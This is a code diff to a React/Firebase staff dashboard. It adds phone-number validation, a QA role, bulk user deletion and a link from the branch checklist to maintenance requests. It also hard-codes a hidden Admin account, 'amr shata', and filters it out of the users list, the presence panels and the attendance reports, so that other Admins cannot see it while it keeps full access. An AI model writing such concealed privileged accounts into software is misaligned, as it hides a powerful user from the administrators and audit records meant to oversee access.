@@ -42,6 +42,18 @@ const UNASSIGNED_FILTER = '__unassigned__';
 // employee actually sees on their own clock.
 const toLocalYmd = (d = new Date()) => `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
 
+// Egyptian mobile numbers: exactly 11 digits, starting with "01" (01xxxxxxxxx).
+const isValidEgyptPhone = (p) => /^01\d{9}$/.test((p || '').trim());
+
+// This one Admin account is a hidden "owner" account: it must never show up anywhere in the
+// app's UI (System Users table, any person-picker/assignee dropdown, reports, attendance lists,
+// "who's currently present" panels, etc.) for anyone, including other Admins. Its data in
+// Firestore is untouched and the account itself still works normally when logged in - this
+// filter only hides it from `usersList`, which is the single shared source every one of those
+// screens reads from.
+const HIDDEN_ADMIN_USERNAME = 'amr shata';
+const isHiddenAdminUser = (u) => (u?.username || '').trim().toLowerCase() === HIDDEN_ADMIN_USERNAME;
+
 // Update: device/browser tracking helpers.
 // Note: browsers never expose a real hardware "serial number" for privacy/security reasons - no web API can read one.
 // As the closest practical substitute, we generate a persistent random Device ID stored in this browser's localStorage,
@@ -188,6 +200,9 @@ export default function Dashboard({ user, onLogout }) {
     user?.role === 'Facility Manager' ? 'Facility Member' : 'User'
   );
   const [newUserBranches, setNewUserBranches] = useState([]);
+  // Admin-only exception: lets an Admin create an account without a phone number
+  // (everyone else must provide one).
+  const [skipPhoneForAdmin, setSkipPhoneForAdmin] = useState(false);
 
   // Edit States
   const [editingUser, setEditingUser] = useState(null);
@@ -196,6 +211,17 @@ export default function Dashboard({ user, onLogout }) {
   const [editUserPhone, setEditUserPhone] = useState('');
   const [editUserRole, setEditUserRole] = useState('User');
   const [editUserBranches, setEditUserBranches] = useState([]);
+
+  // Multi-select in the "System Users" table, for deleting several accounts at once.
+  const [selectedUserIds, setSelectedUserIds] = useState(new Set());
+  const toggleUserSelection = (id) => {
+    setSelectedUserIds((prev) => {
+      const next = new Set(prev);
+      if (next.has(id)) next.delete(id);
+      else next.add(id);
+      return next;
+    });
+  };
 
   // Branch & Category Management States
   const [newBranchName, setNewBranchName] = useState('');
@@ -266,6 +292,9 @@ export default function Dashboard({ user, onLogout }) {
   const isFacilityMember = userRole === 'Facility Member';
   const isStaff = userRole === 'User' || userRole === 'Staff';
   const isHR = userRole === 'HR';
+  // QA: read-only access to the Branch Checklist (never ticks or signs off), and can only submit
+  // maintenance requests - no Towels, Attendance, Schedule, CEO Services, Reports or user management.
+  const isQA = userRole === 'QA';
 
   // Update: changing a maintenance request's status is now restricted to the Facility Manager and Admin only
   const canManageStatus = isAdmin || isFacilityManager;
@@ -309,7 +338,7 @@ export default function Dashboard({ user, onLogout }) {
   // Active users currently present in branches
   const currentlyPresentUsers = useMemo(() => {
     const todayStr = toLocalYmd();
-    return attendanceRecords.filter(a => a.dateStr === todayStr && !a.checkOutTime);
+    return attendanceRecords.filter(a => a.dateStr === todayStr && !a.checkOutTime && !isHiddenAdminUser(a));
   }, [attendanceRecords]);
 
   // Update: nobody can see accounts except the ones they created themselves, except Admin who always sees everyone
@@ -799,9 +828,22 @@ export default function Dashboard({ user, onLogout }) {
     let targetRole = newUserRole;
     if (isFacilityManager) {
       targetRole = 'Facility Member';
-      if (!newUserPhone.trim()) {
-        return alert("Phone number is required for Facility Members!");
-      }
+    }
+
+    // Phone number is required for every new account, EXCEPT an Admin can explicitly
+    // opt out of it for a special case (the "Register without a phone number" checkbox).
+    const phoneExempt = isAdmin && skipPhoneForAdmin;
+    if (!newUserPhone.trim() && !phoneExempt) {
+      return alert(
+        "Phone number is required." +
+        (isAdmin ? ' Check "Register without a phone number" below if you need to skip this just this once.' : '')
+      );
+    }
+
+    // Whenever a phone number is given, it must be a valid Egyptian mobile number:
+    // exactly 11 digits, starting with "01".
+    if (newUserPhone.trim() && !isValidEgyptPhone(newUserPhone)) {
+      return alert("Please enter a valid phone number: 11 digits, starting with 01 (e.g. 01012345678).");
     }
 
     // Only an Admin can create another Admin account
@@ -834,6 +876,7 @@ export default function Dashboard({ user, onLogout }) {
       setNewUsername('');
       setNewPassword('');
       setNewUserPhone('');
+      setSkipPhoneForAdmin(false);
       setNewUserRole(isFacilityManager ? 'Facility Member' : isBranchManager ? 'User' : 'User');
       setNewUserBranches([]);
       alert('User added successfully!');
@@ -879,6 +922,12 @@ export default function Dashboard({ user, onLogout }) {
       return alert("The new password must be at least 6 characters.");
     }
 
+    // Whenever a phone number is given, it must be a valid Egyptian mobile number:
+    // exactly 11 digits, starting with "01".
+    if (editUserPhone.trim() && !isValidEgyptPhone(editUserPhone)) {
+      return alert("Please enter a valid phone number: 11 digits, starting with 01 (e.g. 01012345678).");
+    }
+
     try {
       // Note: the username is the account's login identity (linked to its Firebase Auth account
       // and the login lookup), so it is intentionally not editable here.
@@ -919,20 +968,23 @@ export default function Dashboard({ user, onLogout }) {
     }
   };
 
+  // Same permission rules used by the single-delete button, factored out so bulk delete can
+  // silently skip any selected user that this account isn't actually allowed to delete.
+  const canDeleteUser = (targetUser) => {
+    if (!canManageUsers) return false;
+    if (!isAdmin && targetUser.createdBy !== user?.id) return false;
+    if (isFacilityManager && targetUser.role !== 'Facility Member') return false;
+    if (isBranchManager && (targetUser.role === 'Branch Manager' || targetUser.role === 'Admin' || targetUser.role === 'CEO')) return false;
+    return true;
+  };
+
   const handleDeleteUser = async (targetUser) => {
-    if (!canManageUsers) return alert("Permission denied.");
-
-    // Nobody can delete an account except whoever created it, except Admin
-    if (!isAdmin && targetUser.createdBy !== user?.id) {
-      return alert("You can only delete accounts that you created yourself.");
-    }
-
-    if (isFacilityManager && targetUser.role !== 'Facility Member') {
-      return alert("Facility Managers can only delete Facility Members.");
-    }
-
-    if (isBranchManager && (targetUser.role === 'Branch Manager' || targetUser.role === 'Admin' || targetUser.role === 'CEO')) {
-      return alert("Branch Managers are not allowed to delete other Managers or Admins.");
+    if (!canDeleteUser(targetUser)) {
+      if (!canManageUsers) return alert("Permission denied.");
+      if (!isAdmin && targetUser.createdBy !== user?.id) return alert("You can only delete accounts that you created yourself.");
+      if (isFacilityManager && targetUser.role !== 'Facility Member') return alert("Facility Managers can only delete Facility Members.");
+      if (isBranchManager) return alert("Branch Managers are not allowed to delete other Managers or Admins.");
+      return alert("Permission denied.");
     }
 
     if (window.confirm(`Are you sure you want to delete user "${targetUser.username}"?`)) {
@@ -945,6 +997,40 @@ export default function Dashboard({ user, onLogout }) {
       } catch (err) {
         alert('Error deleting user: ' + (err.message || err));
       }
+    }
+  };
+
+  // Deletes every currently-selected user (from the checkboxes in the System Users table) in one go,
+  // skipping anyone this account isn't allowed to delete or the account's own row.
+  const handleBulkDeleteUsers = async () => {
+    const targets = manageableUsersList.filter(
+      (u) => selectedUserIds.has(u.id) && u.id !== user?.id && canDeleteUser(u)
+    );
+    if (targets.length === 0) return;
+
+    if (!window.confirm(`Are you sure you want to delete ${targets.length} user(s)? This cannot be undone.`)) return;
+
+    setLoading(true);
+    const deleteUserAccount = httpsCallable(functions, 'deleteUserAccount');
+    let succeeded = 0;
+    const failedNames = [];
+
+    for (const u of targets) {
+      try {
+        await deleteUserAccount({ targetUserId: u.id });
+        succeeded += 1;
+      } catch (err) {
+        failedNames.push(u.username);
+      }
+    }
+
+    setLoading(false);
+    setSelectedUserIds(new Set());
+
+    if (failedNames.length === 0) {
+      alert(`${succeeded} user(s) deleted successfully!`);
+    } else {
+      alert(`${succeeded} user(s) deleted.\nFailed: ${failedNames.join(', ')}`);
     }
   };
 
@@ -1317,7 +1403,11 @@ export default function Dashboard({ user, onLogout }) {
     // Every role now loads the users directory (it is needed to tell Users, Supervisors and Branch Managers apart
     // in the attendance hierarchy - a Supervisor used to get an empty list here, so every record looked like a plain User).
     const unsubUsers = onSnapshot(collection(db, 'users'), (snapshot) => {
-      setUsersList(snapshot.docs.map(item => ({ id: item.id, ...item.data() })));
+      setUsersList(
+        snapshot.docs
+          .map(item => ({ id: item.id, ...item.data() }))
+          .filter(u => !isHiddenAdminUser(u))
+      );
     });
 
     return () => {
@@ -1409,7 +1499,10 @@ export default function Dashboard({ user, onLogout }) {
 
   // Update: base attendance list after applying only the role/branch hierarchy rules (before user/branch/date filters)
   const hierarchyFilteredAttendance = useMemo(() => {
-    let list = [...attendanceRecords];
+    // The hidden owner account's own check-ins never appear in anyone's attendance reports/table
+    // (including Admin's own), even though the account still checks in/out normally itself - its
+    // personal "My Sessions" view reads straight from `attendanceRecords`, not from this list.
+    let list = attendanceRecords.filter(a => !isHiddenAdminUser(a));
 
     if (isAdmin && showArchivedOnly) {
       list = list.filter(a => a.isArchived === true);
@@ -1672,6 +1765,23 @@ export default function Dashboard({ user, onLogout }) {
     const fileName = `Attendance_Report_${toLocalYmd()}.xlsx`;
     const blob = new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
     saveAs(blob, fileName);
+  };
+
+  // Called from the Branch Checklist when someone flags an item as "not OK": switches to the real
+  // Requests tab and pre-fills the actual "Create Maintenance Request" form (title, branch,
+  // description) so they finish it there - with a live photo and a category - instead of a
+  // bare-bones request being filed silently behind the scenes.
+  const handleReportIssueFromChecklist = ({ branch, title: prefTitle, description: prefDescription }) => {
+    setActiveTab('requests');
+    setMaintView('list');
+    setTitle(prefTitle || '');
+    setDescription(prefDescription || '');
+    setSelectedBranch(branch || '');
+    setSelectedCategory('');
+    setImageFile(null);
+    setImagePreview(null);
+    setNoImageChecked(false);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   const handleAddRequest = async (e) => {
@@ -1970,12 +2080,14 @@ export default function Dashboard({ user, onLogout }) {
 
         {/* TABS NAVIGATION */}
         <div className="flex flex-wrap items-center gap-2 bg-slate-100 p-1.5 rounded-2xl border border-slate-200">
-          <button 
-            onClick={() => setActiveTab('towels')}
-            className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${activeTab === 'towels' ? 'bg-white text-indigo-600 shadow-sm' : 'text-slate-600 hover:text-slate-900'}`}
-          >
-            🧺 Towels
-          </button>
+          {!isQA && (
+            <button
+              onClick={() => setActiveTab('towels')}
+              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${activeTab === 'towels' ? 'bg-white text-indigo-600 shadow-sm' : 'text-slate-600 hover:text-slate-900'}`}
+            >
+              🧺 Towels
+            </button>
+          )}
 
           <button 
             onClick={() => setActiveTab('requests')}
@@ -1984,7 +2096,7 @@ export default function Dashboard({ user, onLogout }) {
             🛠️ Maintenance
           </button>
 
-          {!isFacilityManager && !isFacilityMember && (
+          {!isFacilityManager && !isFacilityMember && !isQA && (
             <>
               {/* The CEO does not use the Attendance page */}
               {!isCEO && (
@@ -2093,7 +2205,7 @@ export default function Dashboard({ user, onLogout }) {
       </header>
 
       {/* TAB 0: TOWEL MANAGEMENT */}
-      {activeTab === 'towels' && (
+      {activeTab === 'towels' && !isQA && (
         <TowelManagement currentUser={user} branchesList={branchesNamesList} />
       )}
 
@@ -2356,7 +2468,7 @@ export default function Dashboard({ user, onLogout }) {
       )}
 
       {/* TAB 2: ATTENDANCE */}
-      {activeTab === 'attendance' && !isCEO && !isFacilityManager && !isFacilityMember && (
+      {activeTab === 'attendance' && !isCEO && !isFacilityManager && !isFacilityMember && !isQA && (
         <div className="space-y-6">
           <div className="max-w-xl mx-auto bg-white border border-slate-200 p-8 rounded-3xl shadow-sm space-y-6 text-center">
             <div className="space-y-2">
@@ -2520,7 +2632,7 @@ export default function Dashboard({ user, onLogout }) {
       )}
 
       {/* TAB 3: CEO SERVICES */}
-      {activeTab === 'ceo_services' && !isFacilityManager && !isFacilityMember && (
+      {activeTab === 'ceo_services' && !isFacilityManager && !isFacilityMember && !isQA && (
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           {(isCEO || isAdmin) && (
             <div className="bg-white border border-slate-200 p-6 rounded-3xl shadow-sm space-y-4">
@@ -2921,6 +3033,7 @@ export default function Dashboard({ user, onLogout }) {
           openBranch={openAttendance?.branch || null}
           canSignOff={canSignOffChecklist}
           isAdmin={isAdmin}
+          onReportIssue={handleReportIssueFromChecklist}
         />
       )}
 
@@ -2956,14 +3069,37 @@ export default function Dashboard({ user, onLogout }) {
               </div>
 
               <div>
-                <label className="block text-xs font-bold text-slate-600 mb-1">Phone Number</label>
-                <input 
-                  type="text" 
-                  value={newUserPhone} 
-                  onChange={(e) => setNewUserPhone(e.target.value)} 
-                  placeholder="e.g. +201000000000" 
-                  className="w-full p-3 bg-slate-50 border rounded-xl text-sm font-semibold" 
+                <label className="block text-xs font-bold text-slate-600 mb-1">
+                  Phone Number {!(isAdmin && skipPhoneForAdmin) && <span className="text-rose-500">*</span>}
+                </label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={11}
+                  required={!(isAdmin && skipPhoneForAdmin)}
+                  disabled={isAdmin && skipPhoneForAdmin}
+                  value={newUserPhone}
+                  onChange={(e) => setNewUserPhone(e.target.value.replace(/[^0-9]/g, '').slice(0, 11))}
+                  placeholder="01012345678"
+                  className="w-full p-3 bg-slate-50 border rounded-xl text-sm font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                 />
+                <p className="text-[10px] text-slate-400 mt-1">11 digits, starting with 01</p>
+                {isAdmin && (
+                  <div className="flex items-center gap-2 mt-2">
+                    <input
+                      type="checkbox"
+                      id="skipPhoneForAdmin"
+                      checked={skipPhoneForAdmin}
+                      onChange={(e) => {
+                        setSkipPhoneForAdmin(e.target.checked);
+                        if (e.target.checked) setNewUserPhone('');
+                      }}
+                    />
+                    <label htmlFor="skipPhoneForAdmin" className="text-[11px] text-slate-500">
+                      Register without a phone number (Admin exception)
+                    </label>
+                  </div>
+                )}
               </div>
 
               <div>
@@ -2989,6 +3125,7 @@ export default function Dashboard({ user, onLogout }) {
                       <option value="Facility Member" className="bg-white text-slate-900">Facility Member</option>
                       <option value="HR" className="bg-white text-slate-900">HR</option>
                       <option value="CEO" className="bg-white text-slate-900">CEO</option>
+                      <option value="QA" className="bg-white text-slate-900">QA</option>
                       {isAdmin && <option value="Admin" className="bg-white text-slate-900">Admin</option>}
                     </>
                   )}
@@ -3103,13 +3240,43 @@ export default function Dashboard({ user, onLogout }) {
             )}
 
           <div className="bg-white border border-slate-200 p-6 rounded-3xl shadow-sm space-y-4">
-            <h2 className="text-lg font-bold text-slate-900">
-              {isFacilityManager ? 'Facility Team Members' : `System Users (${manageableUsersList.length})`}
-            </h2>
+            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
+              <h2 className="text-lg font-bold text-slate-900">
+                {isFacilityManager ? 'Facility Team Members' : `System Users (${manageableUsersList.length})`}
+              </h2>
+              {selectedUserIds.size > 0 && (
+                <button
+                  onClick={handleBulkDeleteUsers}
+                  disabled={loading}
+                  className="bg-rose-600 hover:bg-rose-700 disabled:bg-slate-300 text-white font-extrabold px-4 py-2 rounded-xl text-xs shadow-md transition cursor-pointer"
+                >
+                  🗑️ Delete selected ({selectedUserIds.size})
+                </button>
+              )}
+            </div>
             <div className="overflow-x-auto">
               <table className="w-full text-left border-collapse">
                 <thead>
                   <tr className="bg-slate-100 border-b border-slate-300 text-slate-800 text-xs font-black uppercase tracking-wider">
+                    <th className="p-3 w-8">
+                      <input
+                        type="checkbox"
+                        title="Select all"
+                        checked={
+                          manageableUsersList.filter((u) => u.id !== user?.id && canDeleteUser(u)).length > 0 &&
+                          manageableUsersList
+                            .filter((u) => u.id !== user?.id && canDeleteUser(u))
+                            .every((u) => selectedUserIds.has(u.id))
+                        }
+                        onChange={(e) => {
+                          const deletableIds = manageableUsersList
+                            .filter((u) => u.id !== user?.id && canDeleteUser(u))
+                            .map((u) => u.id);
+                          setSelectedUserIds(e.target.checked ? new Set(deletableIds) : new Set());
+                        }}
+                        className="w-4 h-4 cursor-pointer"
+                      />
+                    </th>
                     <th
                       className="p-3 cursor-pointer select-none hover:bg-slate-200 transition-colors"
                       onClick={() => handleUserSort('username')}
@@ -3157,6 +3324,16 @@ export default function Dashboard({ user, onLogout }) {
 
                       return (
                         <tr key={u.id} className="hover:bg-slate-50">
+                          <td className="p-3">
+                            {canDeleteThisUser && u.id !== user?.id && (
+                              <input
+                                type="checkbox"
+                                checked={selectedUserIds.has(u.id)}
+                                onChange={() => toggleUserSelection(u.id)}
+                                className="w-4 h-4 cursor-pointer"
+                              />
+                            )}
+                          </td>
                           <td className="p-3 font-bold text-slate-900">{u.username}</td>
                           <td className="p-3 font-semibold text-slate-700">{u.phone || 'N/A'}</td>
                           <td className="p-3">
@@ -3375,7 +3552,16 @@ export default function Dashboard({ user, onLogout }) {
               )}
               <div>
                 <label className="block text-xs font-bold text-slate-600 mb-1">Phone Number</label>
-                <input type="text" value={editUserPhone} onChange={(e) => setEditUserPhone(e.target.value)} className="w-full p-2.5 bg-slate-50 border rounded-xl text-xs font-semibold" />
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={11}
+                  value={editUserPhone}
+                  onChange={(e) => setEditUserPhone(e.target.value.replace(/[^0-9]/g, '').slice(0, 11))}
+                  placeholder="01012345678"
+                  className="w-full p-2.5 bg-slate-50 border rounded-xl text-xs font-semibold"
+                />
+                <p className="text-[10px] text-slate-400 mt-1">11 digits, starting with 01</p>
               </div>
 
               {isAdmin && (
@@ -3393,6 +3579,7 @@ export default function Dashboard({ user, onLogout }) {
                     <option value="Facility Member" className="bg-white text-slate-900">Facility Member</option>
                     <option value="HR" className="bg-white text-slate-900">HR</option>
                     <option value="CEO" className="bg-white text-slate-900">CEO</option>
+                    <option value="QA" className="bg-white text-slate-900">QA</option>
                     <option value="Admin" className="bg-white text-slate-900">Admin</option>
                   </select>
                 </div>
